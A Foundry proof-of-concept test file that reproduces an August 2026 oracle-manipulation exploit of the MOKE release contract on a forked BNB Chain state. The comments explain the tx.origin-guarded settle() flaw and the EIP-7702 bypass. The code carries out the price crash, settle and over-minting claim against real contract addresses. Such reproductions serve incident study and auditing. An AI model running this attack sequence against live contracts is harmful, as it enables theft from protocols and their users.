// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// MOKE (Moke) - claim() over-mint via a public price settle on a manipulable spot oracle,
// reached by EIP-7702 self-delegation. BNB Chain, Aug 2026.
//
// Exploit tx : 0x0776048b1b58064fb31b6513721811e7b44d6bdbe7bf5833158b241ca6756a8f (block 113652609)
// Attacker   : 0xE454a9BAC1a44868e4A9Cbe1a4B5ac231D0DCF8a (EIP-7702 self-delegated EOA)
// Verified contracts (sourcify): MokeRelease 0x684D722E, MokeToken 0x1A35C16c.
//
// Root cause (confirmed against the verified MokeRelease source, not the alert text):
//   - claim() mints MOKE out of the reserve pool to the caller as `pendingUsdt / settledMokePrice`
//     (MokeRelease.claim -> MokeToken.releaseFromPair). `pendingUsdt` vests from the caller's own
//     release quota, so claim() is gated by the caller HAVING a quota - the attacker EOA already
//     held a legitimate 45,000 USDT quota as a protocol participant.
//   - settle() sets `settledMokePrice = getMokeUsdtPrice()` from the live MOKE/BNB * BNB/USDT spot
//     reserves, and its only guard is:
//         require(isSettler[msg.sender] || msg.sender == owner() || msg.sender == tx.origin, ...)
//     The `msg.sender == tx.origin` arm makes settle() callable by ANY externally-owned account.
//   So a quota holder can crash the MOKE/BNB spot, call settle() to latch that crashed price, then
//   call claim(): the same quota now mints ~`quota / crashedPrice` MOKE - here 41,684,057 MOKE from
//   a 45,000 USDT quota (settled price fell from 0.219 to ~0.000594 USDT), a ~200x over-mint. The
//   claim-time deviation check passes because the live price still equals the just-settled crashed
//   price. No admin/owner/governance/signature step stands in the attacker's path: the quota is the
//   attacker's own participant allocation, and settle()/claim()/the price-crash swaps are all public.
//
// WHY EIP-7702 / how this PoC substitutes for it:
//   settle()'s `msg.sender == tx.origin` guard rejects a plain attacker *contract* (msg.sender would
//   be the contract, tx.origin the EOA). The real attacker delegated their OWN EOA to their OWN code
//   via an EIP-7702 set-code tx installed in an earlier block, so the exploit ran AS the EOA with
//   msg.sender == tx.origin. Foundry 1.7.1 cannot construct/replay a 7702 set-code tx here, so this
//   PoC reproduces the identical condition by driving the typed calls directly from the attacker EOA
//   under vm.startPrank(ATTACKER, ATTACKER), which sets msg.sender == tx.origin == ATTACKER. This is
//   a faithful substitution for the self-delegation, not a different access path.
//
// SCOPE / what this asserts:
//   This PoC proves the vulnerability and its direct on-chain effect: the claim() over-mint. It
//   asserts the stolen MOKE (~41,684,057 MOKE minted from the reserve for a 45,000 USDT quota).
//   The real tx then LAUNDERED that stolen MOKE to 1546.536757 BNB through the project's own
//   MokeLPDividend vault and ~100 pre-seeded LP-holder accounts (plus Moolah/Venus flash loans for
//   working capital). The released MOKE is transfer-locked to whitelisted handlers (MokeToken
//   _update), so that cash-out is not a free market sell - it depends on the attacker's pre-seeded
//   100-account dividend position and is attacker plumbing, not the bug. It is NOT reconstructed
//   here; 1546.54 BNB is the laundered realization of the theft asserted below. The MOKE used to
//   crash the spot is supplied via deal() in place of the real flash-loan sourcing.
//
// Run (prague required for the Venus-era state; self-contained BSC archive fork):
//   forge test --contracts ./src/test/2026-10/MOKE_exp.sol --evm-version prague -vvv

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IMokeToken is IERC20 {
    function releasedMokeBalance(address) external view returns (uint256);
}

interface IMokeRelease {
    function settle() external;
    function claim() external payable;
    function settledMokePrice() external view returns (uint256);
    function claimFee() external view returns (uint256);
    function userRelease(address)
        external
        view
        returns (uint256 totalQuotaUsdt, uint256 pendingUsdt, uint256 claimedUsdt, uint256 lastReleaseFactor, uint256 lastClaimTime, uint256 claimedSnapshotAtReset);
    function getMokeUsdtPrice() external view returns (uint256);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract MOKE_exp is Test {
    address internal constant ATTACKER = 0xE454a9BAC1a44868e4A9Cbe1a4B5ac231D0DCF8a;
    IMokeToken internal constant MOKE = IMokeToken(0x1A35C16cE21903Bc17Fd020c4ED73fEdC70c1b2A);
    IMokeRelease internal constant RELEASE = IMokeRelease(0x684D722EbF8980f49492f631f56765DD4Fb302A7);
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    IPancakeRouter internal constant ROUTER = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    uint256 internal constant EXPLOIT_BLOCK = 113_652_609;
    // Real minted amount from the attacker EOA's single claim in the exploit trace.
    uint256 internal constant REAL_STOLEN_MOKE = 41_684_057_233944649146143063;

    string internal constant BSC_ARCHIVE = "https://bsc-mainnet.public.blastapi.io";

    function setUp() public {
        vm.createSelectFork(BSC_ARCHIVE, EXPLOIT_BLOCK - 1);
        vm.label(ATTACKER, "Attacker");
        vm.label(address(MOKE), "MOKE");
        vm.label(address(RELEASE), "MokeRelease");
    }

    function testExploit() public {
        (uint256 quota,,,,,) = RELEASE.userRelease(ATTACKER);
        uint256 priceBefore = RELEASE.getMokeUsdtPrice();
        emit log_named_decimal_uint("Attacker quota (USDT)", quota, 18);
        emit log_named_decimal_uint("MOKE/USDT price before", priceBefore, 18);

        // WBNB used only to crash the BNB/USDT oracle pair (stands in for the real flash-loan sourcing).
        uint256 dumpWbnb = 633_000 ether;
        deal(WBNB, ATTACKER, dumpWbnb);

        vm.startPrank(ATTACKER, ATTACKER); // msg.sender == tx.origin, reproducing the 7702 self-delegation

        // 1. Crash the BNB/USDT spot (0x16b9a8..) that getMokeUsdtPrice() reads as its BNB price.
        IERC20(WBNB).approve(address(ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = USDT;
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(dumpWbnb, 0, path, ATTACKER, block.timestamp);

        // 2. Latch the crashed price via the public settle() (passes on msg.sender == tx.origin).
        RELEASE.settle();
        emit log_named_decimal_uint("settledMokePrice after crash", RELEASE.settledMokePrice(), 18);

        // 3. Claim: the 45,000 USDT quota now mints quota/crashedPrice MOKE from the reserve pool.
        uint256 relBefore = MOKE.releasedMokeBalance(ATTACKER);
        RELEASE.claim{value: RELEASE.claimFee()}();
        uint256 stolen = MOKE.releasedMokeBalance(ATTACKER) - relBefore;

        vm.stopPrank();

        emit log_named_decimal_uint("MOKE over-minted by claim()", stolen, 18);
        // Honest entitlement for the same quota at the pre-crash price, for contrast.
        emit log_named_decimal_uint("honest MOKE at pre-crash price", quota * 1e18 / priceBefore, 18);

        // The direct bug impact: claim() mints ~41.68M MOKE (matches the real attacker EOA claim).
        assertApproxEqRel(stolen, REAL_STOLEN_MOKE, 0.05e18);
    }
}
